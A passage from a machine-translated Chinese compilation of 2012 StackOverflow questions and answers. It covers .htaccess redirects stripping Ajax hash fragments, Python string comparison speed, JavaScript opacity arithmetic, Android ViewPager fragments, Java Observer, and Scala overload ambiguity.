# StackOverflow 问答 12648000-12648999

# javascript - htaccess 搞砸了 Ajax 哈希 # 标记

> ID：12648001
> 
> 赞同：1
> 
> 时间：2012-09-28T22:08:05.583
> 
> 标签：javascript, ajax, .htaccess, hash, slash

我有很多标准规则在 URL 的末尾添加斜杠：

```
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_URI} !(.*)/$
RewriteRule ^(.*[^/])$ $1/ [R=301,L] 
```

Ajax 照片库正在向 URL 中添加一些带有哈希 # 的内容，例如`URL/#photoset_photo_empty_progress`. 我不明白 htaccess 阻止或对哈希字符串做了什么。但它搞砸了，画廊停止工作。

我的想法是，这里可能需要 htaccess 的一些魔法来避免将此规则应用于哈希字符串。

请给我一个解决方案，因为我什至无法理解那里出了什么问题。

* * *

```
var ls = ls || {};

ls.photoset =( function ($) {

    this.idLast=0;
    this.isLoading=false;
    this.swfu;

    this.initSwfUpload = function(opt) {
        opt=opt || {};
        opt.button_placeholder_id = 'photoset-start-upload';
        opt.post_params.ls_photoset_target_tmp = $.cookie('ls_photoset_target_tmp') ? $.cookie('ls_photoset_target_tmp') : 0;

        $(ls.swfupload).unbind('load').bind('load',function() {
            this.swfu = ls.swfupload.init(opt);

            $(this.swfu).bind('eUploadProgress',this.swfHandlerUploadProgress);
            $(this.swfu).bind('eFileDialogComplete',this.swfHandlerFileDialogComplete);
            $(this.swfu).bind('eUploadSuccess',this.swfHandlerUploadSuccess);
            $(this.swfu).bind('eUploadComplete',this.swfHandlerUploadComplete);
        }.bind(this));

        ls.swfupload.loadSwf();
    }

    this.swfHandlerUploadProgress = function(e, file, bytesLoaded, percent) {
        $('#photoset_photo_empty_progress').text(file.name+': '+( percent==100 ? 'resize..' : percent +'%'));
    }

    this.swfHandlerFileDialogComplete = function(e, numFilesSelected, numFilesQueued) {
        if (numFilesQueued>0) {
            ls.photoset.addPhotoEmpty();
        }
    }

    this.swfHandlerUploadSuccess = function(e, file, serverData) {
        ls.photoset.addPhoto(jQuery.parseJSON(serverData));
    }

    this.swfHandlerUploadComplete = function(e, file, next) {
        if (next>0) {
            ls.photoset.addPhotoEmpty();
        }
    }

    this.addPhotoEmpty = function() {
        template = '<li id="photoset_photo_empty"><img src="'+DIR_STATIC_SKIN + '/images/loader.gif'+'" alt="image" style="margin-left: 35px;margin-top: 20px;" />'
                    +'<div id="photoset_photo_empty_progress" style="height: 60px;width: 350px;padding: 3px;border: 1px solid #DDDDDD;"></div><br /></li>';
        $('#swfu_images').append(template);
    }

    this.addPhoto = function(response) {
        $('#photoset_photo_empty').remove();
        if (!response.bStateError) {
            template = '<li id="photo_'+response.id+'"><img src="'+response.file+'" alt="image" />'
                        +'<textarea onBlur="ls.photoset.setPreviewDescription('+response.id+', this.value)"></textarea><br />'
                        +'<a href="javascript:ls.photoset.deletePhoto('+response.id+')" class="image-delete">'+ls.lang.get('topic_photoset_photo_delete')+'</a>'
                        +'<span id="photo_preview_state_'+response.id+'" class="photo-preview-state"><a href="javascript:ls.photoset.setPreview('+response.id+')" class="mark-as-preview">'+ls.lang.get('topic_photoset_mark_as_preview')+'</a></span></li>';
            $('#swfu_images').append(template);
            ls.msg.notice(response.sMsgTitle,response.sMsg);
        } else {
            ls.msg.error(response.sMsgTitle,response.sMsg);
        }
        ls.photoset.closeForm();
    }

    this.deletePhoto = function(id)
    {
        if (!confirm(ls.lang.get('topic_photoset_photo_delete_confirm'))) {return;}
        ls.ajax(aRouter['photoset']+'deleteimage', {'id':id}, function(response){
            if (!response.bStateError) {
                $('#photo_'+id).remove();
                ls.msg.notice(response.sMsgTitle,response.sMsg);
            } else {
                ls.msg.error(response.sMsgTitle,response.sMsg);
            }
        });
    }

    this.setPreview =function(id)
    {
        $('#topic_main_photo').val(id);

        $('.marked-as-preview').each(function (index, el) {
            $(el).removeClass('marked-as-preview');
            tmpId = $(el).attr('id').slice($(el).attr('id').lastIndexOf('_')+1);
            $('#photo_preview_state_'+tmpId).html('<a href="javascript:ls.photoset.setPreview('+tmpId+')" class="mark-as-preview">'+ls.lang.get('topic_photoset_mark_as_preview')+'</a>');
        });
        $('#photo_'+id).addClass('marked-as-preview');
        $('#photo_preview_state_'+id).html(ls.lang.get('topic_photoset_is_preview'));
    }

    this.setPreviewDescription = function(id, text)
    {
        ls.ajax(aRouter['photoset']+'setimagedescription', {'id':id, 'text':text},  function(result){
            if (!result.bStateError) {

            } else {
                ls.msg.error('Error','Please try again later');
            }
        }
        )
    }

    this.getMore = function(topic_id)
    {
        if (this.isLoading) return;
        this.isLoading=true;

        ls.ajax(aRouter['photoset']+'getmore', {'topic_id':topic_id, 'last_id':this.idLast}, function(result){
            this.isLoading=false;
            if (!result.bStateError) {
                if (result.photos) {
                    $.each(result.photos, function(index, photo) {
                        var image = '<li><a class="photoset-image" href="'+photo.path+'" rel="[photoset]" title="'+photo.description+'"><img src="'+photo.path_thumb+'" alt="'+photo.description+'" /></a></li>';
                        $('#topic-photo-images').append(image);
                        this.idLast=photo.id;
                        $('.photoset-image').unbind('click');
                        $('.photoset-image').prettyPhoto({
                            social_tools:'',
                            show_title: false,
                            slideshow:false,
                            deeplinking: false
                        });
                    }.bind(this));
                }
                if (!result.bHaveNext || !result.photos) {
                    $('#topic-photo-more').remove();
                }
            } else {
                ls.msg.error('Error','Please try again later');
            }
        }.bind(this));
    }

    this.upload = function()
    {
        ls.photoset.addPhotoEmpty();
        ls.ajaxSubmit(aRouter['photoset']+'upload/',$('#photoset-upload-form'),function(data){
            if (data.bStateError) {
                $('#photoset_photo_empty').remove();
                ls.msg.error(data.sMsgTitle,data.sMsg);
            } else {
                ls.photoset.addPhoto(data);
            }
        });
        ls.photoset.closeForm();
    }

    this.closeForm = function()
    {
        $('#photoset-upload-form').jqmHide();
    }

    this.showForm = function()
    {
        var $select = $('#photoset-start-upload');
        if ($select.length) {
            var pos = $select.offset();
            w = $select.outerWidth();
            h = $select.outerHeight();
            t = pos.top + h - 30  + 'px';
            l = pos.left - 15 + 'px';
            $('#photoset-upload-form').css({'top':t,'left':l});
        }
        $('#photoset-upload-form').show();
    }

    this.showMainPhoto = function(id) {
        $('#photoset-main-preview-'+id).css('width',$('#photoset-main-image-'+id).outerWidth());
        $('#photoset-photo-count-'+id).show();
        $('#photoset-photo-desc-'+id).show();
    }

    return this;
}).call(ls.photoset || {},jQuery); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:18:42.870

> Ajax 照片库正在向 URL 中添加一些带有哈希 # 的内容，例如`URL/#photoset_photo_empty_progress`. 我不明白 htaccess 阻止或对哈希字符串做了什么。但它搞砸了，画廊停止工作。

它`#`是[URL 片段](http://en.wikipedia.org/wiki/Fragment_identifier)的一部分，浏览器使用它来确定它应该如何处理内容。它用于告诉浏览器滚动到页面的特定部分的命名锚点，以及被javascript（在浏览器/客户端上）使用。**片段永远不会在请求中发送到服务器**。服务器根本看不到片段，它只特定于客户端。

如果您向网络服务器发送 request: `http://myserver.com/index.php#site-map`，服务器在请求中看到的唯一内容是`GET /index.php HTTP/1.1`. 没有`#site-map`。因此，您的重定向实质上会删除由 javascript 放置在那里的片段。没有办法通过服务器绕过它，因为它不知道浏览器是否有一个片段。

可能的解决方法：

1.  确保整个站点上的所有链接（包括您生成的任何链接）都带有斜杠，这样您就不需要重定向。
2.  每当进行照片库 AJAX 调用时，添加某种 javascript 以包含尾部斜杠
3.  修改您的 mod_rewrite 重定向代码，使其*不会*重定向照片库的 AJAX 调用。

# python - 什么会影响超过 64 个字符的字符串的 Python 字符串比较性能？

> ID：12648002
> 
> 赞同：26
> 
> 时间：2012-09-28T22:08:12.507
> 
> 标签：python, string, performance, time-complexity

我正在尝试评估比较两个字符串是否会随着长度的增加而变慢。我的计算表明比较字符串应该花费一个摊销的常数时间，但我的 Python 实验产生了奇怪的结果：

这是字符串长度（1 到 400）与时间（以毫秒为单位）的关系图。自动垃圾收集被禁用，并`gc.collect`在每次迭代之间运行。

![时间与字符串长度](../Images/deadc09bb20dc87de3db7fdfc71fe252.png)

我每次比较 100 万个随机字符串，计数匹配如下。该过程重复 50 次，然后取所有测量时间的最小值。

```
for index in range(COUNT):
    if v1[index] == v2[index]:
        matches += 1
    else:
        non_matches += 1 
```

什么可能导致长度 64 左右突然增加？

**注意**：以下代码段可用于尝试重现问题，假设`v1`和`v2`是两个长度的随机字符串列表，`n`而 COUNT 是它们的长度。

```
timeit.timeit("for i in range(COUNT): v1[i] == v2[i]",
  "from __main__ import COUNT, v1, v2", number=50) 
```

**进一步说明**：我做了两个额外的测试：比较 string with`is`而不是`==`完全抑制问题，性能约为 210ms/1M 比较。由于提到了实习，我确保在每个字符串后添加一个空格，这应该可以防止实习；这不会改变任何事情。那除了实习之外还有别的吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-28T22:40:30.910

Python*可以*“实习”短字符串；将它们存储在一个特殊的缓存中，并重新使用该缓存中的字符串对象。

然后比较字符串时，它会首先测试它是否是相同的指针（例如，一个内部字符串）：

```
if (a == b) {
    switch (op) {
    case Py_EQ:case Py_LE:case Py_GE:
        result = Py_True;
        goto out;
// ... 
```

只有当指针比较失败时，它才会使用大小检查并`memcmp`比较字符串。

实习通常只发生在标识符（函数名、参数、属性等）上，但不适用于在运行时创建的字符串值。

另一个可能的罪魁祸首是字符串常量。代码中使用的字符串文字在编译时存储为常量并在整个过程中重复使用；再次只创建一个对象，并且对这些对象进行身份测试更快。

对于不相同的字符串对象，Python 测试相等的长度，相等的第一个字符，然后`memcmp()`在内部 C 字符串上使用该函数。如果您的字符串*没有*被保留或以其他方式重用相同的对象，则所有其他速度特征都归结为该`memcmp()`函数。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-28T22:31:24.437

我只是在做疯狂的猜测，但您问的是“可能发生什么”而不是什么，所以这里有一些可能性：

*   CPU 缓存行大小为 64 字节，较长的字符串会导致缓存未命中。
*   Python 可能将 64 字节的字符串存储在一种结构中，而将更长的字符串存储在更复杂的结构中。
*   与最后一个相关：它可以将字符串补零成一个 64 字节的数组，并且能够使用非常快速的 SSE2 向量指令来匹配两个字符串。

# javascript - 节点环境中附加的 js 代码的性能

> ID：12648004
> 
> 赞同：0
> 
> 时间：2012-09-28T22:08:19.843
> 
> 标签：javascript, node.js

有时我会通过编写一段代码来让自己感到惊讶，这可能是我猜想的性能最差的代码。代码仅读取目录中的所有文件（文件为纯文本），并在 1/10 秒的间隔后在控制台上打印每个文件的每一行。现在使用下面的方法，如果文件中有 100 万行，将定义 100 万个 setTimeout 函数。并且每 1/10 秒一个 setTimeout 将调用其各自的函数。我只是好奇下面的代码将如何影响性能？在 nodejs env 中定义数百万个回调可以吗？你对下面的代码有什么想法。

```
 function scanDir(dir){
            fs.readdir(dir , function(err , list){
                var interval = 0;
                list.forEach(function(file, index){
                    lineReader.eachLine(dir + "/" + file, function(line, last) {
                     interval += 100;
                      (function(line){
                         setTimeout(function(){
                         console.log(line+"\n\r");
                         },interval)
                      })(line);

                      if (last) {
                        return false; // stop reading
                      }
                    });
                })
            })
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T04:16:26.607

您不能定义数百万个回调，在大约 12,000 个左右之后，您将用完调用堆栈上的空间。这是您将得到的错误：

```
RangeError: Maximum call stack size exceeded 
```

现在，如果您真的需要，可以通过使用以下命令行参数来增加调用堆栈大小，但我认为它永远不会支持数百万个回调。

```
node --max-stack-size=val 
```

如果不真正了解您要完成的工作，就很难建议对您的代码进行其他改进。如果你真的有一百万行，以每 1/10 秒 1 的速度打印这些行将花费超过一天的时间，你为什么要这样做？

# objective-c - 在为 AdHoc 或 Distribution / Release 构建时，properties 和 ivars 是否最初没有设置为零或零？

> ID：12648005
> 
> 赞同：0
> 
> 时间：2012-09-28T22:08:21.967
> 
> 标签：objective-c, ios, xcode

刚刚有人告诉我，但我简直不敢相信。如果没有这个，我在 AppStore 上的应用程序会一直崩溃。

这是真的吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T22:15:47.063

没有; ivars 在分配时始终初始化为零/0/nil/NULL/Nil。

事实上，当分配一个 Objective-C 对象时，与分配相关的内存实际上是`bzero()`d。

# javascript - 如何增加javascript中的不透明度？

> ID：12648007
> 
> 赞同：3
> 
> 时间：2012-09-28T22:08:38.830
> 
> 标签：javascript, opacity

我希望能够使用

```
element.style.opacity += 0.1; 
```

或者

```
element.style.opacity = element.style.opacity + 0.1; 
```

但这不起作用。不透明度不会改变。如果我将不透明度设置为静态值，例如

```
element.style.opacity = 0.5; 
```

它确实有效。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-28T22:11:21.637

`element.style.opacity`（假设它完全被定义）将是一个字符串，而不是一个数字。

```
"0.1" + 0.1 === "0.10.1" 
```

你可能想要：

```
element.style.opacity = parseFloat(element.style.opacity) + 0.1; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-07-20T22:39:59.673

我突然想到，您实际上可以通过字符串因子降低不透明度，如下所示：

```
element.style.opacity -= '0.1'; 
```

这将工作得很好，但不是相反，因为运算符 += 试图附加到结果字符串。然而，增量可以通过做来实现

```
element.style.opacity -= '-0.1'; 
```

这将根据需要增加它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-28T22:16:40.597

我建议以下，`opacity`如果它尚未定义，它会分配一个预定义的值：

```
// using a simple onclick for demo purposes
t.onclick = function(){
    var opacity = this.style.opacity;
    this.style.opacity = opacity ? (parseFloat(opacity) + 0.1) : 0.2;
};​​​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/r6BSU/)。

`opacity`这似乎是必要的，因为如果尚未在 in-line`style`属性中定义，则该值似乎不会增加。如果这是你*的*定义，那么这种方法可能没有必要。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-24T14:48:52.950

您也可以使用[`.toString();`](https://www.w3schools.com/jsref/jsref_tostring_number.asp)方法

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-08-26T13:51:49.187

您可能希望在 css 中设置关键帧并将 id 或类添加到元素

```
Example for calling a keyframe:
.myElement{
position:absolute;
background:blue;
-webkit-animation:KeyframeName 1s linear infinite;
}

Example for a keyframe:
@-webkit-keyframes KeyframeName {
0%{style code here, example: opacity:1;}
100%{style code here, example: opacity:0;}
} 
```

唯一的缺点是： - 您必须为所有浏览器设置关键帧。- 在移动设备上它需要大量的电量，这意味着您的页面变得不可触摸或无法点击。并且很难同时使用多个关键帧。

或者

尝试在 javascript 中创建一个函数并将此代码放入其中：

```
var OpacityValue = 1;
function OpacityChange(){
    if(OpacityValue == 0.0){
        Opacity = 0.0;
        clearInterval(TimerName);
     }
     else if(OpacityValue > 0){
        OpacityValue += -0.1;
     }
     yourElement.style.opacity = OpacityValue;
} 
```

使用计时器启动此功能，您将获得不透明度，当其值为 0.0 时将停止不要忘记放置 var TimerName ；作为全局，否则你不能停止计时器！

# android - 刷新 viewpager、lsitfragment 还是适配器？

> ID：12648008
> 
> 赞同：0
> 
> 时间：2012-09-28T22:08:41.870
> 
> 标签：android, android-viewpager, baseadapter, android-listfragment

我有一个主类，其中包含一个带有标签和 viewpager 的 actionbarsherlock

就这个：

```
public class HSG_Handball extends SherlockFragmentActivity
{
    ViewPager mViewPager;
    TabsAdapter mTabsAdapter;
    TextView tabCenter;
    TextView tabText;

    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);

        mViewPager = new ViewPager(this);
        mViewPager.setId(R.id.pager);

        setContentView(mViewPager);
        ActionBar bar = getSupportActionBar();
        bar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);

        mTabsAdapter = new TabsAdapter(this, mViewPager);

        mTabsAdapter.addTab(bar.newTab().setText("Alle Spiele"), Spiele.class, null);
        mTabsAdapter.addTab(bar.newTab().setText("Tabelle"), Tabelle.class, null);
    }

    public static class TabsAdapter extends FragmentPagerAdapter implements ActionBar.TabListener, ViewPager.OnPageChangeListener
    {
        private final Context mContext;
        private final ActionBar mActionBar;
        private final ViewPager mViewPager;
        private final ArrayList<TabInfo> mTabs = new ArrayList<TabInfo>();

        static final class TabInfo
        {
            private final Class<?> clss;
            private final Bundle args;

            TabInfo(Class<?> _class, Bundle _args)
            {
                clss = _class;
                args = _args;
            }
        }

        public TabsAdapter(SherlockFragmentActivity activity, ViewPager pager)
        {
            super(activity.getSupportFragmentManager());
            mContext = activity;
            mActionBar = activity.getSupportActionBar();
            mViewPager = pager;
            mViewPager.setAdapter(this);
            mViewPager.setOnPageChangeListener(this);
        }

        public void addTab(ActionBar.Tab tab, Class<?> clss, Bundle args)
        {
            TabInfo info = new TabInfo(clss, args);
            tab.setTag(info);
            tab.setTabListener(this);
            mTabs.add(info);
            mActionBar.addTab(tab);
            notifyDataSetChanged();
        }

        @Override
        public int getCount()
        {
            return mTabs.size();
        }

        @Override
        public Fragment getItem(int position)
        {
            TabInfo info = mTabs.get(position);
            return Fragment.instantiate(mContext, info.clss.getName(), info.args);
        }

        public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels)
        {
        }

        public void onPageSelected(int position)
        {
            mActionBar.setSelectedNavigationItem(position);
        }

        public void onPageScrollStateChanged(int state)
        {
        }

        public void onTabSelected(Tab tab, FragmentTransaction ft)
        {
            Object tag = tab.getTag();
            for (int i = 0; i < mTabs.size(); i++)
            {
                if (mTabs.get(i) == tag)
                {
                    mViewPager.setCurrentItem(i);
                }
            }
        }

        public void onTabUnselected(Tab tab, FragmentTransaction ft)
        {
        }

        public void onTabReselected(Tab tab, FragmentTransaction ft)
        {
        }
    }

    public boolean onCreateOptionsMenu(Menu menu) 
    {

        SubMenu subMenu1 = menu.addSubMenu("Aktive");
        subMenu1.add("Herren 1");
        subMenu1.add("Herren 2");
        subMenu1.add("Herren 3");
        subMenu1.add("Damen 1");
        subMenu1.add("Damen 2");

        MenuItem subMenu1Item = subMenu1.getItem();
        subMenu1Item.setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS | MenuItem.SHOW_AS_ACTION_WITH_TEXT);

        SubMenu subMenu2 = menu.addSubMenu("Jugend");
        subMenu2.add("männl. A");
        subMenu2.add("weibl. A");
        subMenu2.add("männl. B1");
        subMenu2.add("männl. B2");
        subMenu2.add("männl. C");
        subMenu2.add("männl. D");
        subMenu2.add("E-Jugend");

        MenuItem subMenu2Item = subMenu2.getItem();
        subMenu2Item.setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS | MenuItem.SHOW_AS_ACTION_WITH_TEXT);

        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item)
    {
        if(!item.getTitle().toString().equals("Active") || !item.getTitle().toString().equals("Jugend"))
        {
            new Spiele().FormatiereSpieleSeite(item.getTitle().toString());
        }
        return super.onOptionsItemSelected(item);
    }
} 
```

第二个类（Spiele）是一个带有自定义基本适配器的列表片段。这个类看起来是这样的：

公共类 Spiele 扩展 ListFragment {

```
String ligaId = "0";
SpieleAdapterFuerCustomList adapter;

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState)
{
        View view = inflater.inflate(R.layout.spiele, container, false);

        List<String> dateAndSchiri = new ArrayList<String>();
        dateAndSchiri.add("DATUM  ·  Schiri 1 : Schiri 2");
        dateAndSchiri.add("DATUM  ·  Schiri 1 : Schiri 2");
        dateAndSchiri.add("DATUM  ·  Schiri 1 : Schiri 2");

        List<String> heim = new ArrayList<String>();
        heim.add("HSG Nieder-Roden");
        heim.add("SG Bruchköbel");
        heim.add("LOL Idiotenklupp");

        List<String> gast = new ArrayList<String>();
        gast.add("KG Wallau");
        gast.add("DJ G4bby");
        gast.add("Hanzup Motherf*ckers");

        adapter = new SpieleAdapterFuerCustomList(getActivity(), dateAndSchiri, heim, gast);
        setListAdapter(adapter);

        return view;
}

public void FormatiereSpieleSeite(String mannschaft)
    {
// aktive
        if(mannschaft.equals("Herren 1"))
            ligaId = "X0";
        if(mannschaft.equals("Herren 2"))
            ligaId = "00151350asd0";
        if(mannschaft.equals("Herren 3"))
            ligaId = "00151asdad000000000000000001000";
        if(mannschaft.equals("Damen 1"))
            ligaId = "001513asdad0000000007000";
        if(mannschaft.equals("Damen 2"))
            ligaId = "0015135asd0000000000003000";

// jugend
        if(mannschaft.equals("männl. A"))
            ligaId = "0015135asdasd0000000000001000";
        if(mannschaft.equals("weibl. A"))
            ligaId = "";
        if(mannschaft.equals("männl. B1"))
            ligaId = "001513asdasd0000000000000002000";
        if(mannschaft.equals("männl. B2"))
            ligaId = "00151350asd05502000000000000001000";
        if(mannschaft.equals("männl. C"))
            ligaId = "0015asdasd503000000000000001000";
        if(mannschaft.equals("männl. D"))
            ligaId = "001513504501asdsad0000001000";
        if(mannschaft.equals("E-Jugend"))
            ligaId = "0015135asdasd000000000003000";

    System.out.println(ligaId + "Das ist liga");

    List<String> dateAndSchiri = new ArrayList<String>();
    dateAndSchiri.add("DATUM as Schiri 2");
    dateAndSchiri.add("DATUMasas Schisdfsdfri 2");
    dateAndSchiri.add("DATUMasas Schirsdfsfi 2");

    List<String> heim = new ArrayList<String>();
    heim.add("HSG Nieder-sdfRoden");
    heim.add("SG Brucsdfhköbel");
    heim.add("LOL Idiosdfsdftenklupp");

    List<String> gast = new ArrayList<String>();
    gast.add("KG Walsdfsflau");
    gast.add("DJ G4sdfsfbby");
    gast.add("Hanzusdfsfp Motherf*ckers");

    adapter = new SpieleAdapterFuerCustomList(getActivity(), dateAndSchiri, heim, gast);
    adapter.notifyDataSetChanged();
    setListAdapter(adapter);

} 
```

}

一切正常，运行良好。

在“主要”类上。拥有 viewpager 和 tabsactionbar 的类有菜单。如果用户单击其中一个，它必须加载一个新的 ListFragment。或者一个新的 BaseAdapter(?)。我希望 ListFragment（类：Spiele）是更新的。但我该怎么做？如何更新我的 ListFragment？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T20:22:23.987

为什么这个 ArrayList 带有 TabInfo？为什么不直接使用带有 Fragments 的 ArrayList。不是在适配器中，而是在 Activity 本身中？

在这种情况下，您可以执行以下操作：

1.

```
public void addTab(ActionBar.Tab tab, Class<?> clss, Bundle args)
{
   tab.setTabListener(this);
   Fragment f = Fragment.instantiate(mContext, clss.getName(), args);
   mFragments.add(f);
   mActionBar.addTab(tab);
   notifyDataSetChanged();
} 
```

2.

```
@Override
public boolean onOptionsItemSelected(MenuItem item)
{
    if(!item.getTitle().toString().equals("Active") || !item.getTitle().toString().equals("Jugend"))
    {
        Fragment f = mFragments.get(getSupportActionBar().getSelectedTab().getPosition());
        ((Spiele)f).FormatiereSpieleSeite(item.getTitle().toString());
    }
    return true;
} 
```

如果我对您的理解正确，您要做的就是更改适配器。对？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-04T14:50:03.660

解决方案比我想象的要容易。

这些[https://stackoverflow.com/a/7393477/1231245](https://stackoverflow.com/a/7393477/1231245)帮助我从 ViewPager 中的第一个 Fragment 中找到 FragmentTag。

我可以在 onOptionsItemSelected 方法中轻松创建和设置适配器。就这个：

```
 List<String> dateAndSchiri = new ArrayList<String>();
        dateAndSchiri.add.....

        List<String> heim = new ArrayList<String>();
        heim.add.....

        List<String> gast = new ArrayList<String>();
        gast.add.....

        SpieleAdapterFuerCustomList adapter = new SpieleAdapterFuerCustomList(getBaseContext(), dateAndSchiri, heim, gast);
        Spiele articleFrag = (Spiele) getSupportFragmentManager().findFragmentByTag("android:switcher:"+R.id.pager+":0");
        articleFrag.setListAdapter(adapter); 
```

您可以通过不同的单击菜单创建具有不同 ArrayList 的新适配器...

# java - 在 Java 中使用 Observer 理解 MVC

> ID：12648010
> 
> 赞同：1
> 
> 时间：2012-09-28T22:08:50.497
> 
> 标签：java, model-view-controller, observer-pattern

[我从这个例子](http://www.austintek.com/mvc/)学习 Java MVC 。

如果**View**是[Observer](http://docs.oracle.com/javase/6/docs/api/java/util/Observer.html)和**Model** [Observable](http://docs.oracle.com/javase/6/docs/api/java/util/Observable.html)，为什么该`Observer.update`方法在第一个参数中接受 Observable ？如果 View 与 Model 一起工作（依赖于它的一些方法），它就不能重用。第二个参数不应该是视图应该使用的唯一参数吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:24:24.330

> 为什么 Observer.update 方法在第一个参数中接受 Observable ？

可观察对象是启动更新调用的对象，它在调用中传递对自身的引用，这样观察者就可以毫无疑问地知道是谁在进行调用。想象一下如果观察者同时观察多个可观察对象会发生什么。这种类型的参数传递将有助于消除对该调用来源的混淆。这与在 Swing ChangeEvent 对象或 ActionEvent 对象中传递对调用对象的引用几乎没有什么不同。

# mobile-safari - iOS 6 不播放 Vimeo 嵌入式视频

> ID：12648014
> 
> 赞同：7
> 
> 时间：2012-09-28T22:09:10.450
> 
> 标签：mobile-safari, ios6, vimeo

这是我的第一个问题。我已经在 StackOverflow 和 Google 上搜索了所有答案，但一直找不到答案。

我使用 Vimeo 的通用 iFrame 代码在我的网站上嵌入了一个视频。该视频如下所示，可以在任何桌面浏览器和 iOS 5 设备上正常播放。

**问题来自于 iOS 的最新更新......** 现在在 iOS 6 上，视频将无法播放。相反，它将陷入“加载”保持模式。在 iPhone Simulator for XCODE 上使用 iOS 6 会产生相同的结果。有问题的确切视频的链接如下。在较旧的 iOS 5 设备上加载，视频开始正​​常播放。

注意：该视频也不能在 iOS 6 Chrome 上播放，但可以在 iOS 5 Chrome 上播放。

[http://www.seriouslyfunny.tv/2011/03/padded-room-promo/](http://www.seriouslyfunny.tv/2011/03/padded-room-promo/)

有任何想法吗？我觉得这是一个愚蠢的新手问题，某人 8 岁的侄子会知道答案。

# c# - Gridview 固定页眉

> ID：12648018
> 
> 赞同：3
> 
> 时间：2012-09-28T22:09:40.980
> 
> 标签：c#, jquery, asp.net, css, gridview

我有一个大约 200 行的 GridView，我需要一个固定的标题。页面的标题不固定。

我怎样才能使用任何东西来实现这一点：C#、CSS 或 Javascript/Jquery？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-28T13:30:26.017

如果不使用水平滚动，你不能把数据网格放在一个 div 中。然后在 datagrid div 中创建一个 header div，margin-top 为 0；或类似的东西。

只需使用您的 CSS 对其进行样式设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:19:02.067

试试[jqgrid](http://www.trirand.com/blog/?page_id=5)。它有很多惊人的功能。[对于您的要求，请参阅演示](http://trirand.com/blog/jqgrid/jqgrid.html)页面上的“True Scrolling Rows” （3.6 版中的新增部分）。

您还将找到几个 asp.net 演示

# scala - 当类型已知时，为什么对重载定义的引用不明确？

> ID：12648019
> 
> 赞同：4
> 
> 时间：2012-09-28T22:09:47.813
> 
> 标签：scala, compiler-construction

我有这样的功能：

```
def ifSome[B, _](pairs:(Option[B], B => _)*) {
  for((paramOption, setFunc) <- pairs)
    for(someParam <- paramOption) setFunc(someParam)
} 
```

和像这样的重载函数：

```
class Foo{ 
  var b=""
  def setB(b:String){this.b = b}
  def setB(b:Int){this.b = b.toString}
}

val f = new Foo 
```

那么下面的行会产生一个错误：

```
ifSome(Option("hi") -> f.setB _)

<console>:11: error: ambiguous reference to overloaded definition,
both method setB in class Foo of type (b: Int)Unit
and  method setB in class Foo of type (b: String)Unit
match expected type ?
                 ifSome(Option("hi") -> f.setB _) 
```

但是编译器知道我们正在寻找一个 Function1[java.lang.String, _]，那么为什么 Function1[Int, _] 的存在会造成任何混乱呢？我是否遗漏了什么或者这是一个编译器错误（或者它应该是一个功能请求）？

我能够通过使用像这样的类型注释来解决这个问题

```
ifSome(Option("hi") -> (f.setB _:String=>Unit)) 
```

但我想了解为什么这是必要的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:34:31.760

Scala 中的类型推断仅适用于从一个参数*列表*到下一个参数列表。由于您`ifSome`只有一个参数列表，因此 Scala 不会推断任何内容。您可以`ifSome`进行如下更改：

```
def ifSome[B, _](opts:Option[B]*)(funs: (B => _)*) {
  val pairs = opts.zip(funs)
  for((paramOption, setFunc) <- pairs)
    for(someParam <- paramOption) setFunc(someParam)
} 
```

让 Foo 保持原样...

```
class Foo{ 
  var b=""
  def setB(b:String){this.b = b}
  def setB(b:Int){this.b = b.toString}
}

val f = new Foo 
```

并将调用更改为`ifSome`：

```
ifSome(Option("hi"))(f.setB _) 
```

这一切都有效。现在当然你必须在运行时检查是否`opts`和`funs`具有相同的长度。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-29T05:13:24.140

你会想尝试`$ scalac -Ydebug -Yinfer-debug x.scala`，但首先你会想最小化。

在这种情况下，您将看到在 curried 版本中，B 如何在第一个参数列表中解决：

```
[infer method] solving for B in (bs: B*)(bfs: Function1[B, _]*)Nothing 
based on (String)(bfs: Function1[B, _]*)Nothing (solved: B=String) 
```

对于非咖喱版本，你会看到一些奇怪的地方

```
[infer view] <empty> with pt=String => Int 
```

因为它试图消除重载的歧义，这可能会导致您找到下面奇怪的解决方案。

虚拟隐含的唯一目的是解决过载，以便推理可以继续进行。隐式本身未使用且未实现`???`

这是一个非常奇怪的解决方案，但你知道重载是邪恶的，对吧？你必须用你可以使用的任何工具来对抗邪恶。

另请参阅您的类型注释解决方法比仅以正常方式指定类型参数更费力。

```
object Test extends App {
  def f[B](pairs: (B, B => _)*) = ???
  def f2[B](bs: B*)(bfs: (B => _)*) = ???

  def g(b: String) = ???
  def g(b: Int) = ???

  // explicitly
  f[String](Pair("hi", g _))

  // solves for B in first ps
  f2("hi")(g _)

  // using Pair instead of arrow means less debug output
  //f(Pair("hi", g _))

  locally {
    // unused, but selects g(String) and solves B=String
    import language.implicitConversions
